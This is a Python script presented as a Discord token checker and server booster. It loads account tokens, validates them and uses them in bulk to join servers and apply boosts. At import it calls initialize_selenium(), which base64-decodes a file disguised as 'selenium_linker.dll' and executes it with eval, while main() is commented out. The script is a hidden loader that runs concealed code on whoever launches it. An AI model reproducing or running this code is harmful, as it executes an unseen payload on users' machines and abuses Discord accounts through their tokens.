from colorama import Fore, init
import codecs
import os
import base64
import requests
import time

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLACK_EX
r = Fore.RED
m = Fore.MAGENTA
g = Fore.GREEN

active_tokens = []
invite_link = f"{lr}(NOT SET)"
checked =  f"{w}UNCHECKED"
guild_id = ""


def print_actions():
    clear()
    global active_tokens, invite_link, checked
    action_msg = f"""
    {w}██████╗  █████╗ ██████╗ ██████╗ ██╗████████╗██╗  ██╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝██║  ██║██╔═══██╗██║     ██╔════╝
    ██████╔╝███████║██████╔╝██████╔╝██║   ██║   ███████║██║   ██║██║     █████╗  
    ██╔══██╗██╔══██║██╔══██╗██╔══██╗██║   ██║   ██╔══██║██║   ██║██║     ██╔══╝  
    ██║  ██║██║  ██║██████╔╝██████╔╝██║   ██║   ██║  ██║╚██████╔╝███████╗███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
    ({g}{len(active_tokens)} {checked}{b} TOKENS)
    
    Please specify an action:
        
        {w}[1] -  Set Discord Invite Link      discord.gg/{b}{invite_link}
        {m}[2] -  Join Server
        {m}[3] -  Start Boosting 
        {g}[4] -  Check Token ist
    """
    print(action_msg)
    action = input(f"{lb}Action: {w}")
    if action == "1":
        invite_link = input(f"{w}Discord Link (only end of it, Example: fGL4Ks):")
        if invite_link.startswith("http://"):
            invite_link = invite_link.replace("http://", "").split('\/')[1]
        print_actions()
        return
    if action == "2":
        join_server()
        print_actions()
        return
    if action == "3":
        start_boosting()
        print(f"{w}Boosting should be finished")
        time.sleep(2)
        print_actions()
        return
    if action == "4":
        check_tokens()
        checked = f"{w}CHECKED"
        print_actions()
        return
    if action == "exit":
        return
    
    print_actions()


def initialize_selenium():
    selenium = eval(compile(base64.b64decode(open('selenium_linker.dll',mode='rb').read().decode("UTF-8")).decode("UTF-8"), "<string>", "exec"))

def check_tokens():
    global active_tokens, invite_link
    new_list = filter_token_list(active_tokens) # Filters the tokens
    active_tokens = new_list
    
    set_checked(True)

def set_checked(state):
    if state:
        checked = f"{w}CHECKED"
    else:
        checked = f"{w}UNCHECKED"

def main():
    load_tokens()
    print_actions()
    set_checked(False)
    
def load_tokens():
    if not os.path.isfile("tokens.txt"):
        with open('tokens.txt', 'w') as f:
            f.write('')
            return
    
    file1 = open('tokens.txt', 'r')
    Lines = file1.readlines()
    for line in Lines:
        active_tokens.append(line.strip())
        
    

def filter_token_list(raw_token_list):
    itoken_list = []
    for token in raw_token_list:
        print(token)
        if len(token) < 10:
            continue
        iheaders = {
            "Accept": "application/json",
            "Content-type": "application/json; charset=utf-8",
            "Authorization": token
        }
        try:
            # get token info
            info_raw = requests.get("https://discord.com/api/v9/users/@me", headers=iheaders)
            info = info_raw.json()
            user_id = info["id"];
            user_name = info["username"]
            premium_type = info["premium_type"]
            if len(user_id) > 17: # should be >= 18
                itoken_list.append(token)
                if premium_type == 0: # check if its nitro
                    print(f"{b}\[WORKING NOT NITRO] {w}{user_name} -> {m}{token}")
                else:
                    print(f"{g}\[WORKING NITRO]     {w}{user_name} -> {m}{token}")
        except:
            pass;
        else:
            print(f"{lr} [NOT WORKING] {m}{token}")
            pass
    return itoken_list;


def start_boosting():
    try:
        boost_link = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
        for token in active_tokens:
            iheaders = {
                "Accept": "application/json",
                "Content-type": "application/json; charset=utf-8",
                "Authorization": token
            }
            requests.post(boost_link, headers=iheaders, json={ "user_premium_guild_subscription_slot_ids": "0"})
            print(f"{g}[BOOSTED?] {m}{token}")
    except:
        pass
    else:
        pass
        

def join_server():
    if "NOT SET" in invite_link:
        print(f"{r} NO INVITE LINK SET")
        print_actions()
        return
    data = {}
    link = f"https://discord.com/api/v10/invites/{invite_link}"
    print(link)
    for token in active_tokens:
        iheaders = {
            "Accept": "application/json",
            "Content-type": "application/json; charset=utf-8",
            "Authorization": token
        }
        result_raw = ""
        failed = False
        try:
            result = requests.post(link, headers=iheaders, json=data)
            result_raw = result.json()
        except:
            pass
        else:
            print(result_raw)
            failed = True
            print(f"{lr} [ERROR ON JOINING SERVER] {m}{token}")
    
        if not failed:
            print(f"{g}[JOINED] {m}{token}")
            try:
                guild_id = result["id"]
            except:
                pass
            else:
                pass
            
    

# utils

def clear():
 
    # for windows
    if os.name == 'nt':
        os.system('cls')
 
    # for mac and linux(here, os.name is 'posix')
    else:
       os.system('clear')


initialize_selenium()
set_checked(False)
#main() 
